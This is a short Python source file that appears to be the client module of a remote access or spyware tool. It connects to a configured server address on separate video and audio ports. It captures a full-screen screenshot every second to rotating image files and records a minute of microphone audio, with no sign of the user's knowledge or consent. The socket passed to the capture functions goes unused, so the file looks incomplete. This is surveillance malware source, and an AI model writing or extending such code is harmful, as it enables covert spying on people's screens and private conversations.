import socket
import time
import pyautogui
from lib import audio, client, config


# =====================
# Screen Capturer
# =====================
def video_shell(server: socket.socket):
    try:
        count = 0
        while True:
            image = pyautogui.screenshot()  # Screenshot full screen
            image.save(f"./{str(count % 60)}.png")
            time.sleep(1)  # reduce CPU usage
            count += 1
    except Exception as e:
        print("[VIDEO_CLIENT_ERROR]", e)


# =====================
# Microphone Audio Recorder
# =====================
def audio_shell(server: socket.socket):
    audio.record(60)


def connect_video_server():
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(video_server, (config.IP, config.VDO_PORT), video_shell, 5)


def connect_audio_server():
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(audio_server, (config.IP, config.AUD_PORT), audio_shell, 5)
